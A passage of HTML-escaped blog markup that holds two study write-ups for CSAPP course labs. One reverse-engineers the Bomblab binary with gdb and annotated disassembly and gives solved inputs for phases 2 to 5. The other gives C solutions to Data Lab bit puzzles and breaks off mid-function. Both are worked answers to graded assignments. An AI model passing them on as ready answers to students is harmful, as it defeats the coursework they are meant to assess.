  400f02:	48 89 e6             	mov    %rsp,%rsi
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;在函数调用结束的位置创建断点&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;(gdb) break *0x400f0a
Breakpoint 3 at 0x400f0a
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;随便输入6个数&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;Phase 1 defused. How about the next one?
1 2 3 4 5 6
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;查看一下&lt;code&gt;%rsp&lt;/code&gt;最近的6个数&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;(gdb) x/6wd $rsp
0x7fffffffe150: 1       2       3       4
0x7fffffffe160: 5       6
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;看来确实是读取了6个数&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;  400f0a:	83 3c 24 01          	cmpl   $0x1,(%rsp)      第一个数是1
  400f0e:	74 20                	je     400f30 &amp;lt;phase_2+0x34&amp;gt;
  400f10:	e8 25 05 00 00       	callq  40143a &amp;lt;explode_bomb&amp;gt;
  400f15:	eb 19                	jmp    400f30 &amp;lt;phase_2+0x34&amp;gt;
  400f17:	8b 43 fc             	mov    -0x4(%rbx),%eax
  400f1a:	01 c0                	add    %eax,%eax       后一个数是前一个数的两倍
  400f1c:	39 03                	cmp    %eax,(%rbx)
  400f1e:	74 05                	je     400f25 &amp;lt;phase_2+0x29&amp;gt;
  400f20:	e8 15 05 00 00       	callq  40143a &amp;lt;explode_bomb&amp;gt;
  400f25:	48 83 c3 04          	add    $0x4,%rbx
  400f29:	48 39 eb             	cmp    %rbp,%rbx
  400f2c:	75 e9                	jne    400f17 &amp;lt;phase_2+0x1b&amp;gt;
  400f2e:	eb 0c                	jmp    400f3c &amp;lt;phase_2+0x40&amp;gt;
  400f30:	48 8d 5c 24 04       	lea    0x4(%rsp),%rbx
  400f35:	48 8d 6c 24 18       	lea    0x18(%rsp),%rbp
  400f3a:	eb db                	jmp    400f17 &amp;lt;phase_2+0x1b&amp;gt;
  400f3c:	48 83 c4 28          	add    $0x28,%rsp
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;分析出第二关的答案是&lt;code&gt;1 2 4 8 16 32&lt;/code&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;Welcome to my fiendish little bomb. You have 6 phases with
which to blow yourself up. Have a nice day!
Border relations with Canada have never been better.
Phase 1 defused. How about the next one?
1 2 4 8 16 32
That&#39;s number 2.  Keep going!
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;phase_3&#34;&gt;phase_3&lt;/h3&gt;
&lt;pre&gt;&lt;code&gt;  400f43:	48 83 ec 18          	sub    $0x18,%rsp
  400f47:	48 8d 4c 24 0c       	lea    0xc(%rsp),%rcx
  400f4c:	48 8d 54 24 08       	lea    0x8(%rsp),%rdx
  400f51:	be cf 25 40 00       	mov    $0x4025cf,%esi
  400f56:	b8 00 00 00 00       	mov    $0x0,%eax
  400f5b:	e8 90 fc ff ff       	callq  400bf0 &amp;lt;__isoc99_sscanf@plt&amp;gt;
  400f60:	83 f8 01             	cmp    $0x1,%eax
  400f63:	7f 05                	jg     400f6a &amp;lt;phase_3+0x27&amp;gt;
  400f65:	e8 d0 04 00 00       	callq  40143a &amp;lt;explode_bomb&amp;gt;
  400f6a:	83 7c 24 08 07       	cmpl   $0x7,0x8(%rsp)
  400f6f:	77 3c                	ja     400fad &amp;lt;phase_3+0x6a&amp;gt;
  400f71:	8b 44 24 08          	mov    0x8(%rsp),%eax
  400f75:	ff 24 c5 70 24 40 00 	jmpq   *0x402470(,%rax,8)       //jmp 0x400fb9
  400f7c:	b8 cf 00 00 00       	mov    $0xcf,%eax
  400f81:	eb 3b                	jmp    400fbe &amp;lt;phase_3+0x7b&amp;gt;
  400f83:	b8 c3 02 00 00       	mov    $0x2c3,%eax
  400f88:	eb 34                	jmp    400fbe &amp;lt;phase_3+0x7b&amp;gt;
  400f8a:	b8 00 01 00 00       	mov    $0x100,%eax
  400f8f:	eb 2d                	jmp    400fbe &amp;lt;phase_3+0x7b&amp;gt;
  400f91:	b8 85 01 00 00       	mov    $0x185,%eax
  400f96:	eb 26                	jmp    400fbe &amp;lt;phase_3+0x7b&amp;gt;
  400f98:	b8 ce 00 00 00       	mov    $0xce,%eax
  400f9d:	eb 1f                	jmp    400fbe &amp;lt;phase_3+0x7b&amp;gt;
  400f9f:	b8 aa 02 00 00       	mov    $0x2aa,%eax
  400fa4:	eb 18                	jmp    400fbe &amp;lt;phase_3+0x7b&amp;gt;
  400fa6:	b8 47 01 00 00       	mov    $0x147,%eax
  400fab:	eb 11                	jmp    400fbe &amp;lt;phase_3+0x7b&amp;gt;
  400fad:	e8 88 04 00 00       	callq  40143a &amp;lt;explode_bomb&amp;gt;
  400fb2:	b8 00 00 00 00       	mov    $0x0,%eax
  400fb7:	eb 05                	jmp    400fbe &amp;lt;phase_3+0x7b&amp;gt;
  400fb9:	b8 37 01 00 00       	mov    $0x137,%eax
  400fbe:	3b 44 24 0c          	cmp    0xc(%rsp),%eax
  400fc2:	74 05                	je     400fc9 &amp;lt;phase_3+0x86&amp;gt;
  400fc4:	e8 71 04 00 00       	callq  40143a &amp;lt;explode_bomb&amp;gt;
  400fc9:	48 83 c4 18          	add    $0x18,%rsp
  400fcd:	c3                   	retq
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;根据phase_2猜测&lt;code&gt;&amp;lt;__isoc99_sscanf@plt&amp;gt;&lt;/code&gt;应该是一个从stdin输入的函数，所以我们把断点打在他后面。&lt;br&gt;
反复尝试几次后发现保存在%eax的返回值应该是输入参数的个数，需要大于一个，之后使用&lt;code&gt;mov 0x8(%rsp),%eax&lt;/code&gt;将第一个参数传给%eax，通过%eax的值决定&lt;code&gt;jmpq *0x402470(,%rax,8)&lt;/code&gt;跳转到哪一步，我传的是1，跳转到了&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;  400fb7:	eb 05                	jmp    400fbe &amp;lt;phase_3+0x7b&amp;gt;
  400fb9:	b8 37 01 00 00       	mov    $0x137,%eax
  400fbe:	3b 44 24 0c          	cmp    0xc(%rsp),%eax
  400fc2:	74 05                	je     400fc9 &amp;lt;phase_3+0x86&amp;gt;
  400fc4:	e8 71 04 00 00       	callq  40143a &amp;lt;explode_bomb&amp;gt;
  400fc9:	48 83 c4 18          	add    $0x18,%rsp
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;容易看出第二个参数应该是&lt;code&gt;0x137&lt;/code&gt;&lt;/p&gt;
&lt;h3 id=&#34;phase_4&#34;&gt;phase_4&lt;/h3&gt;
&lt;pre&gt;&lt;code&gt;000000000040100c &amp;lt;phase_4&amp;gt;:
  40100c:	48 83 ec 18          	sub    $0x18,%rsp
  401010:	48 8d 4c 24 0c       	lea    0xc(%rsp),%rcx
  401015:	48 8d 54 24 08       	lea    0x8(%rsp),%rdx
  40101a:	be cf 25 40 00       	mov    $0x4025cf,%esi
  40101f:	b8 00 00 00 00       	mov    $0x0,%eax
  401024:	e8 c7 fb ff ff       	callq  400bf0 &amp;lt;__isoc99_sscanf@plt&amp;gt;
  401029:	83 f8 02             	cmp    $0x2,%eax                   两个参数
  40102c:	75 07                	jne    401035 &amp;lt;phase_4+0x29&amp;gt;
  40102e:	83 7c 24 08 0e       	cmpl   $0xe,0x8(%rsp)              第一个参数&amp;lt;=0xe (14)
  401033:	76 05                	jbe    40103a &amp;lt;phase_4+0x2e&amp;gt;
  401035:	e8 00 04 00 00       	callq  40143a &amp;lt;explode_bomb&amp;gt; 
  40103a:	ba 0e 00 00 00       	mov    $0xe,%edx
  40103f:	be 00 00 00 00       	mov    $0x0,%esi
  401044:	8b 7c 24 08          	mov    0x8(%rsp),%edi
  401048:	e8 81 ff ff ff       	callq  400fce &amp;lt;func4&amp;gt;
  40104d:	85 c0                	test   %eax,%eax                   
  40104f:	75 07                	jne    401058 &amp;lt;phase_4+0x4c&amp;gt;        func4需要返回0   
  401051:	83 7c 24 0c 00       	cmpl   $0x0,0xc(%rsp)               第二个参数为0
  401056:	74 05                	je     40105d &amp;lt;phase_4+0x51&amp;gt;
  401058:	e8 dd 03 00 00       	callq  40143a &amp;lt;explode_bomb&amp;gt;
  40105d:	48 83 c4 18          	add    $0x18,%rsp
  401061:	c3                   	retq
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;我们可以比较容易解读出这关需要两个参数，且 &lt;code&gt;arg1&amp;lt;=14,arg2=0&lt;/code&gt;，func4需要返回0，所以重点是对func4的解读&lt;/p&gt;
&lt;h5 id=&#34;func4&#34;&gt;func4&lt;/h5&gt;
&lt;pre&gt;&lt;code&gt;  400fce:	48 83 ec 08          	sub    $0x8,%rsp
  400fd2:	89 d0                	mov    %edx,%eax
  400fd4:	29 f0                	sub    %esi,%eax
  400fd6:	89 c1                	mov    %eax,%ecx
  400fd8:	c1 e9 1f             	shr    $0x1f,%ecx
  400fdb:	01 c8                	add    %ecx,%eax
  400fdd:	d1 f8                	sar    %eax                  
  400fdf:	8d 0c 30             	lea    (%rax,%rsi,1),%ecx    
  400fe2:	39 f9                	cmp    %edi,%ecx
  400fe4:	7e 0c                	jle    400ff2 &amp;lt;func4+0x24&amp;gt;
  400fe6:	8d 51 ff             	lea    -0x1(%rcx),%edx
  400fe9:	e8 e0 ff ff ff       	callq  400fce &amp;lt;func4&amp;gt;
  400fee:	01 c0                	add    %eax,%eax
  400ff0:	eb 15                	jmp    401007 &amp;lt;func4+0x39&amp;gt;
  400ff2:	b8 00 00 00 00       	mov    $0x0,%eax             
  400ff7:	39 f9                	cmp    %edi,%ecx                   
  400ff9:	7d 0c                	jge    401007 &amp;lt;func4+0x39&amp;gt;
  400ffb:	8d 71 01             	lea    0x1(%rcx),%esi        
  400ffe:	e8 cb ff ff ff       	callq  400fce &amp;lt;func4&amp;gt;
  401003:	8d 44 00 01          	lea    0x1(%rax,%rax,1),%eax
  401007:	48 83 c4 08          	add    $0x8,%rsp
  40100b:	c3                   	retq
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;func4传入3个参数  &lt;code&gt;arg1&lt;/code&gt; &lt;code&gt;0&lt;/code&gt; &lt;code&gt;14&lt;/code&gt; ,然后就不是很看得懂了...不过从14往下试，也不是很多，最后发现arg1是7&lt;br&gt;
所以答案是&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;7 0
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;phase_5&#34;&gt;phase_5&lt;/h3&gt;
&lt;pre&gt;&lt;code&gt;  401062:	53                   	push   %rbx
  401063:	48 83 ec 20          	sub    $0x20,%rsp
  401067:	48 89 fb             	mov    %rdi,%rbx
  40106a:	64 48 8b 04 25 28 00 	mov    %fs:0x28,%rax
  401071:	00 00 
  401073:	48 89 44 24 18       	mov    %rax,0x18(%rsp)
  401078:	31 c0                	xor    %eax,%eax
  40107a:	e8 9c 02 00 00       	callq  40131b &amp;lt;string_length&amp;gt;
  40107f:	83 f8 06             	cmp    $0x6,%eax           估计是个6位的字符串
  401082:	74 4e                	je     4010d2 &amp;lt;phase_5+0x70&amp;gt;
  401084:	e8 b1 03 00 00       	callq  40143a &amp;lt;explode_bomb&amp;gt;
  401089:	eb 47                	jmp    4010d2 &amp;lt;phase_5+0x70&amp;gt;
  40108b:	0f b6 0c 03          	movzbl (%rbx,%rax,1),%ecx
  40108f:	88 0c 24             	mov    %cl,(%rsp)               
  401092:	48 8b 14 24          	mov    (%rsp),%rdx
  401096:	83 e2 0f             	and    $0xf,%edx                   留下每个字符的低4位
  401099:	0f b6 92 b0 24 40 00 	movzbl 0x4024b0(%rdx),%edx         按rdx的值从maduiersnfotvbylSo you think you can stop the bomb with ctrl-c, do you?取字
  4010a0:	88 54 04 10          	mov    %dl,0x10(%rsp,%rax,1)
  4010a4:	48 83 c0 01          	add    $0x1,%rax
  4010a8:	48 83 f8 06          	cmp    $0x6,%rax
  4010ac:	75 dd                	jne    40108b &amp;lt;phase_5+0x29&amp;gt;
  4010ae:	c6 44 24 16 00       	movb   $0x0,0x16(%rsp)
  4010b3:	be 5e 24 40 00       	mov    $0x40245e,%esi               flyers
  4010b8:	48 8d 7c 24 10       	lea    0x10(%rsp),%rdi
  4010bd:	e8 76 02 00 00       	callq  401338 &amp;lt;strings_not_equal&amp;gt;   字符串应该等于flyers
  4010c2:	85 c0                	test   %eax,%eax
  4010c4:	74 13                	je     4010d9 &amp;lt;phase_5+0x77&amp;gt;
  4010c6:	e8 6f 03 00 00       	callq  40143a &amp;lt;explode_bomb&amp;gt;
  4010cb:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
  4010d0:	eb 07                	jmp    4010d9 &amp;lt;phase_5+0x77&amp;gt;
  4010d2:	b8 00 00 00 00       	mov    $0x0,%eax
  4010d7:	eb b2                	jmp    40108b &amp;lt;phase_5+0x29&amp;gt;
  4010d9:	48 8b 44 24 18       	mov    0x18(%rsp),%rax
  4010de:	64 48 33 04 25 28 00 	xor    %fs:0x28,%rax
  4010e5:	00 00 
  4010e7:	74 05                	je     4010ee &amp;lt;phase_5+0x8c&amp;gt;
  4010e9:	e8 42 fa ff ff       	callq  400b30 &amp;lt;__stack_chk_fail@plt&amp;gt;
  4010ee:	48 83 c4 20          	add    $0x20,%rsp
  4010f2:	5b                   	pop    %rbx
  4010f3:	c3                   	retq
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;这题需要根据我们输入一个6位字符串，根据每个字符低四位的值从 &lt;code&gt;0x4024b0&lt;/code&gt; 处的字符串取出对应位子的字符，而目标应该是&lt;code&gt;0x40245e&lt;/code&gt; 处的字符 &lt;code&gt;flyers&lt;/code&gt; 。根据映射，我们的低四位分别应该是&lt;code&gt;9 f e 5 6 7&lt;/code&gt; ,查ASCII得&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;ionefg
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;phase_6&#34;&gt;phase_6&lt;/h3&gt;
&lt;pre&gt;&lt;code&gt;  4010f4:	41 56                	push   %r14
  4010f6:	41 55                	push   %r13
  4010f8:	41 54                	push   %r12
  4010fa:	55                   	push   %rbp
  4010fb:	53                   	push   %rbx
  4010fc:	48 83 ec 50          	sub    $0x50,%rsp
  401100:	49 89 e5             	mov    %rsp,%r13
  401103:	48 89 e6             	mov    %rsp,%rsi
  401106:	e8 51 03 00 00       	callq  40145c &amp;lt;read_six_numbers&amp;gt;
  40110b:	49 89 e6             	mov    %rsp,%r14
  40110e:	41 bc 00 00 00 00    	mov    $0x0,%r12d
  401114:	4c 89 ed             	mov    %r13,%rbp
  401117:	41 8b 45 00          	mov    0x0(%r13),%eax
  40111b:	83 e8 01             	sub    $0x1,%eax
  40111e:	83 f8 05             	cmp    $0x5,%eax
  401121:	76 05                	jbe    401128 &amp;lt;phase_6+0x34&amp;gt;
  401123:	e8 12 03 00 00       	callq  40143a &amp;lt;explode_bomb&amp;gt;
  401128:	41 83 c4 01          	add    $0x1,%r12d
  40112c:	41 83 fc 06          	cmp    $0x6,%r12d
  401130:	74 21                	je     401153 &amp;lt;phase_6+0x5f&amp;gt;
  401132:	44 89 e3             	mov    %r12d,%ebx
  401135:	48 63 c3             	movslq %ebx,%rax
  401138:	8b 04 84             	mov    (%rsp,%rax,4),%eax
  40113b:	39 45 00             	cmp    %eax,0x0(%rbp)
  40113e:	75 05                	jne    401145 &amp;lt;phase_6+0x51&amp;gt;
  401140:	e8 f5 02 00 00       	callq  40143a &amp;lt;explode_bomb&amp;gt;
  401145:	83 c3 01             	add    $0x1,%ebx
  401148:	83 fb 05             	cmp    $0x5,%ebx
  40114b:	7e e8                	jle    401135 &amp;lt;phase_6+0x41&amp;gt;
  40114d:	49 83 c5 04          	add    $0x4,%r13
  401151:	eb c1                	jmp    401114 &amp;lt;phase_6+0x20&amp;gt;
  401153:	48 8d 74 24 18       	lea    0x18(%rsp),%rsi
  401158:	4c 89 f0             	mov    %r14,%rax
  40115b:	b9 07 00 00 00       	mov    $0x7,%ecx
  401160:	89 ca                	mov    %ecx,%edx
  401162:	2b 10                	sub    (%rax),%edx
  401164:	89 10                	mov    %edx,(%rax)
  401166:	48 83 c0 04          	add    $0x4,%rax
  40116a:	48 39 f0             	cmp    %rsi,%rax
  40116d:	75 f1                	jne    401160 &amp;lt;phase_6+0x6c&amp;gt;
  40116f:	be 00 00 00 00       	mov    $0x0,%esi
  401174:	eb 21                	jmp    401197 &amp;lt;phase_6+0xa3&amp;gt;
  401176:	48 8b 52 08          	mov    0x8(%rdx),%rdx
  40117a:	83 c0 01             	add    $0x1,%eax
  40117d:	39 c8                	cmp    %ecx,%eax
  40117f:	75 f5                	jne    401176 &amp;lt;phase_6+0x82&amp;gt;
  401181:	eb 05                	jmp    401188 &amp;lt;phase_6+0x94&amp;gt;
  401183:	ba d0 32 60 00       	mov    $0x6032d0,%edx
  401188:	48 89 54 74 20       	mov    %rdx,0x20(%rsp,%rsi,2)
  40118d:	48 83 c6 04          	add    $0x4,%rsi
  401191:	48 83 fe 18          	cmp    $0x18,%rsi
  401195:	74 14                	je     4011ab &amp;lt;phase_6+0xb7&amp;gt;
  401197:	8b 0c 34             	mov    (%rsp,%rsi,1),%ecx
  40119a:	83 f9 01             	cmp    $0x1,%ecx
  40119d:	7e e4                	jle    401183 &amp;lt;phase_6+0x8f&amp;gt;
  40119f:	b8 01 00 00 00       	mov    $0x1,%eax
  4011a4:	ba d0 32 60 00       	mov    $0x6032d0,%edx
  4011a9:	eb cb                	jmp    401176 &amp;lt;phase_6+0x82&amp;gt;
  4011ab:	48 8b 5c 24 20       	mov    0x20(%rsp),%rbx
  4011b0:	48 8d 44 24 28       	lea    0x28(%rsp),%rax
  4011b5:	48 8d 74 24 50       	lea    0x50(%rsp),%rsi
  4011ba:	48 89 d9             	mov    %rbx,%rcx
  4011bd:	48 8b 10             	mov    (%rax),%rdx
  4011c0:	48 89 51 08          	mov    %rdx,0x8(%rcx)
  4011c4:	48 83 c0 08          	add    $0x8,%rax
  4011c8:	48 39 f0             	cmp    %rsi,%rax
  4011cb:	74 05                	je     4011d2 &amp;lt;phase_6+0xde&amp;gt;
  4011cd:	48 89 d1             	mov    %rdx,%rcx
  4011d0:	eb eb                	jmp    4011bd &amp;lt;phase_6+0xc9&amp;gt;
  4011d2:	48 c7 42 08 00 00 00 	movq   $0x0,0x8(%rdx)
  4011d9:	00 
  4011da:	bd 05 00 00 00       	mov    $0x5,%ebp
  4011df:	48 8b 43 08          	mov    0x8(%rbx),%rax
  4011e3:	8b 00                	mov    (%rax),%eax
  4011e5:	39 03                	cmp    %eax,(%rbx)
  4011e7:	7d 05                	jge    4011ee &amp;lt;phase_6+0xfa&amp;gt;
  4011e9:	e8 4c 02 00 00       	callq  40143a &amp;lt;explode_bomb&amp;gt;
  4011ee:	48 8b 5b 08          	mov    0x8(%rbx),%rbx
  4011f2:	83 ed 01             	sub    $0x1,%ebp
  4011f5:	75 e8                	jne    4011df &amp;lt;phase_6+0xeb&amp;gt;
  4011f7:	48 83 c4 50          	add    $0x50,%rsp
  4011fb:	5b                   	pop    %rbx
  4011fc:	5d                   	pop    %rbp
  4011fd:	41 5c                	pop    %r12
  4011ff:	41 5d                	pop    %r13
  401201:	41 5e                	pop    %r14
  401203:	c3                   	retq
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;头秃...遂放弃&lt;br&gt;
&lt;a href=&#34;https://www.jianshu.com/p/c219e4df2521&#34;&gt;这里有一份解答&lt;/a&gt;&lt;br&gt;
&lt;img src=&#34;http://static.yulan.net.cn/image/_6a0aaf69b5a27ac03ea4b91b3838098b.jpeg&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
">CSAPP: Bomblab</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://yulan.net.cn/post/uscxh7_cc7kxq/"" data-c="
          &lt;p&gt;试验获取请到官网 &lt;a href=&#34;http://csapp.cs.cmu.edu/3e/labs.html&#34;&gt;CSAPP&lt;/a&gt;&lt;/p&gt;
&lt;h3 id=&#34;1bitxor&#34;&gt;1.bitXor&lt;/h3&gt;
&lt;pre&gt;&lt;code class=&#34;language-cpp&#34;&gt;int bitXor(int x, int y) {
  return (~(x&amp;amp;y)) &amp;amp; (~((~x)&amp;amp;(~y)));
}
&lt;/code&gt;&lt;/pre&gt;
&lt;ul&gt;
&lt;li&gt;左边表达式筛选出 &lt;code&gt;0,1 1,0 0,0&lt;/code&gt; 三种情况得到1，右边表达式排除 &lt;code&gt;0,0&lt;/code&gt; 得到1，二者一起得到 &lt;code&gt;0,1 1,0&lt;/code&gt; 即异或&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;2tmin&#34;&gt;2.tmin&lt;/h3&gt;
&lt;pre&gt;&lt;code class=&#34;language-cpp&#34;&gt;int tmin(void) {
  return 1&amp;lt;&amp;lt;31;
}
&lt;/code&gt;&lt;/pre&gt;
&lt;ul&gt;
&lt;li&gt;很简单&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;3istmax&#34;&gt;3.isTmax&lt;/h3&gt;
&lt;pre&gt;&lt;code class=&#34;language-cpp&#34;&gt;int isTmax(int x) {
  return !(((~(x+1))^x) | (!(~x)));
}
&lt;/code&gt;&lt;/pre&gt;
&lt;ul&gt;
&lt;li&gt;或运算 &lt;code&gt;|&lt;/code&gt; 左边筛选出 &lt;code&gt;0x7fffffff&lt;/code&gt;  和 &lt;code&gt;0xffffffff&lt;/code&gt;  得到全0 , 右边对于 &lt;code&gt;0x7fffffff&lt;/code&gt; 得到全0， 对于 &lt;code&gt;0xffffffff&lt;/code&gt;  得到1 ，经过或运算之后只有目标Tmax &lt;code&gt;0x7fffffff&lt;/code&gt; 会得到0，取非之后返回&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;4alloddbits&#34;&gt;4.AllOddBits&lt;/h3&gt;
&lt;pre&gt;&lt;code class=&#34;language-cpp&#34;&gt;int allOddBits(int x) {
  int allodd0 = (0x55&amp;lt;&amp;lt;24) + (0x55&amp;lt;&amp;lt;16) + (0x55&amp;lt;&amp;lt;8) +0x55;
  return !(~(allodd0 | x));
}
&lt;/code&gt;&lt;/pre&gt;
&lt;ul&gt;
&lt;li&gt;比较简单，用奇数位全0，偶数位全1去进行或运算即可&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;5negate&#34;&gt;5.negate&lt;/h3&gt;
&lt;pre&gt;&lt;code class=&#34;language-cpp&#34;&gt;int negate(int x) {
  return (~x) + 1;
}
&lt;/code&gt;&lt;/pre&gt;
&lt;ul&gt;
&lt;li&gt;x + ~x + 1 = 0&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;6isascciidigit&#34;&gt;6.isAscciiDigit&lt;/h3&gt;
&lt;pre&gt;&lt;code class=&#34;language-cpp&#34;&gt;int isAsciiDigit(int x) {
  int a = (x&amp;gt;&amp;gt;3)^0x6;
  int b = x^0x38;
  int c = x^0x39;
  return !a | !b | !c;
}
&lt;/code&gt;&lt;/pre&gt;
&lt;ul&gt;
&lt;li&gt;a 筛选出 &lt;code&gt;0x30&lt;/code&gt;  至 &lt;code&gt;0x37&lt;/code&gt;  ，若符合 a 的值为 0 ，b 筛选 &lt;code&gt;0x38&lt;/code&gt; ， c 筛选 &lt;code&gt;0x39&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;7conditional&#34;&gt;7.conditional&lt;/h3&gt;
&lt;pre&gt;&lt;code class=&#34;language-cpp&#34;&gt;int conditional(int x, int y, int z) {
  int negative1 = ~1 + 1;	//-1
  int control = !x + negative1;		//x=0 ,c=0 ;x!=0 ,c=0xffffffff 
  return (y&amp;amp;control) + (z&amp;amp;(~control));
}
&lt;/code&gt;&lt;/pre&gt;
&lt;ul&gt;
&lt;li&gt;想了好久，思路在代码里，关键点是 &lt;code&gt;0-1=0xffffffff&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;8islessorequal&#34;&gt;8.isLessOrEqual&lt;/h3&gt;
&lt;pre&gt;&lt;code class=&#34;language-cpp&#34;&gt;int isLessOrEqual(int x, int y) {
  int negativex = ~x+1;
  int a = !((!(x&amp;gt;&amp;gt;31))|(y&amp;gt;&amp;gt;31));	//x&amp;lt;0 且 y&amp;gt;=0
  int b = (( !((x&amp;gt;&amp;gt;31)^(y&amp;gt;&amp;gt;31)) ) &amp;amp; (!((y+negativex)&amp;gt;&amp;gt;31) | !(x^(1&amp;lt;&amp;lt;31)))); 
  //			x,y异号			且 ( 	y-x&amp;gt;=0			或   x=0xffffffff )
  return a | b;
}
&lt;/code&gt;&lt;/pre&gt;
&lt;ul&gt;
&lt;li&gt;这道题就是用来说明 &lt;code&gt;x&amp;lt;=y&lt;/code&gt;  不代表 &lt;code&gt;x-y&amp;lt;=0&lt;/code&gt; 的，Tmin 和 Tmax 两个边界很要命 ，还有运算可能溢出。&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;9logicalneg&#34;&gt;9.logicalNeg&lt;/h3&gt;
&lt;pre&gt;&lt;code class=&#34;language-cpp&#34;&gt;int logicalNeg(int x) {
  return ((x|(~x+1))&amp;gt;&amp;gt;31)+1;;
}
&lt;/code&gt;&lt;/pre&gt;
&lt;ul&gt;
&lt;li&gt;除了 0 和 Tmin 以外，所有数和其补码都是异号的，而 Tmin 的符号位为1，所以在和自己的补码逻辑或运算以后，只有 0 的符号位为 0 ，以此求解&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;10howmanybits&#34;&gt;10.howManyBits&lt;/h3&gt;
&lt;pre&gt;&lt;code class=&#34;language-cpp&#34;&gt;int howManyBits(int x) {
 int shift1,shift2,shift4,shift8,shift16;
 int sum;
 int t=((!x)&amp;lt;&amp;lt;31)&amp;gt;&amp;gt;31;//x为0时，t（二进制）全为1，x不为0时，全为1
 int t2=((!~x)&amp;lt;&amp;lt;31)&amp;gt;&amp;gt;31;//当x为-1时，t2全为1，否则，全为0
 int op=x^((x&amp;gt;&amp;gt;31));//正数不变，负数取反
 shift16=(!!(op&amp;gt;&amp;gt;16))&amp;lt;&amp;lt;4;//如果高十六位全为0，则0左移4位，不全为0，则1左移4（表示op要右移2^4位）位
 op=op&amp;gt;&amp;gt;shift16;
 shift8=(!!(op&amp;gt;&amp;gt;8))&amp;lt;&amp;lt;3;
 op=op&amp;gt;&amp;gt;shift8;
 shift4=(!!(op&amp;gt;&amp;gt;4))&amp;lt;&amp;lt;2;
 op=op&amp;gt;&amp;gt;shift4;
 shift2=(!!(op&amp;gt;&amp;gt;2))&amp;lt;&amp;lt;1;
 op=op&amp;gt;&amp;gt;shift2;
 shift1=(!!(op&amp;gt;&amp;gt;1));
 op=op&amp;gt;&amp;gt;shift1;
 sum=2+shift16+shift8+shift4+shift2+shift1;
 return(t2&amp;amp;1)|((~t2)&amp;amp;((t&amp;amp;1)|((~t)&amp;amp;sum)));
}
&lt;/code&gt;&lt;/pre&gt;
&lt;ul&gt;
&lt;li&gt;略有点复杂，最后参考了&lt;a href=&#34;https://blog.csdn.net/tzh476/article/details/51284938&#34;&gt;这篇 &lt;/a&gt;，这个二分法挺巧妙的&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;11floatscale2&#34;&gt;11.floatScale2&lt;/h3&gt;
&lt;pre&gt;&lt;code class=&#34;language-cpp&#34;&gt;unsigned floatScale2(unsigned uf) {
  int e = (uf&amp;gt;&amp;gt;23) &amp;amp; 0xff;
  int rte = e+1;
  if(!e)//e=0
	return (uf&amp;amp;0xf0000000) + ((uf&amp;amp;0x7fffff)&amp;lt;&amp;lt;1);
  else if(!(e^0xff))
	return uf;
  else if(rte&amp;amp;(1&amp;lt;&amp;lt;8))
	return ((uf&amp;gt;&amp;gt;31)&amp;lt;&amp;lt;31) + (0xff&amp;lt;&amp;lt;23);
  else
    return (uf&amp;amp;(0x807fffff)) + (rte&amp;lt;&amp;lt;23);
}
&lt;/code&gt;&lt;/pre&gt;
&lt;ul&gt;
&lt;li&gt;规格化的浮点数乘2就是把阶码加一，非规格化和特殊值单独处理&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;12floatfloat2int&#34;&gt;12.floatFloat2Int&lt;/h3&gt;
&lt;pre&gt;&lt;code class=&#34;language-cpp&#34;&gt;int floatFloat2Int(unsigned uf)
{
  int e = (uf &amp;gt;&amp;gt; 23) &amp;amp; 0xff;	//阶码
  int f = uf &amp;amp; 0x7fffff;		//尾码
  int tag = uf &amp;amp; 0x80000000;	//符号位
  if (e &amp;lt;= 126)		//小于0
    return 0;
  else if (e &amp;gt; 157)	//上溢
    return 0x80000000;
  else		//范围内
  {
    int s = e - 127;
    f = f + 0x800000;
    if (s &amp;gt;= 23)
    {
      int r = f &amp;lt;&amp;lt; (s - 23);
      if (tag)
        return -r;
      else
        return r;
    }
    else
    {
      int r = (f &amp;gt;&amp;gt; (23 - s));
      if (tag)
        return -r;
      else
        return r;
    }
  }
}
&lt;/code&gt;&lt;/pre&gt;
&lt;ul&gt;
&lt;li&gt;题目不难，就是逻辑有点复杂，还要注意c/c++中的舍入是断尾法&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;13floatpower2&#34;&gt;13.floatPower2&lt;/h2&gt;
&lt;pre&gt;&lt;code class=&#34;language-cpp&#34;&gt;unsigned floatPower2(int x) {
    unsigned INF = 0xff &amp;lt;&amp;lt; 23; // 阶码全1
    int e = 127 + x;    // 得到阶码
    if (x &amp;lt; 0) // 阶数小于0直接返回0
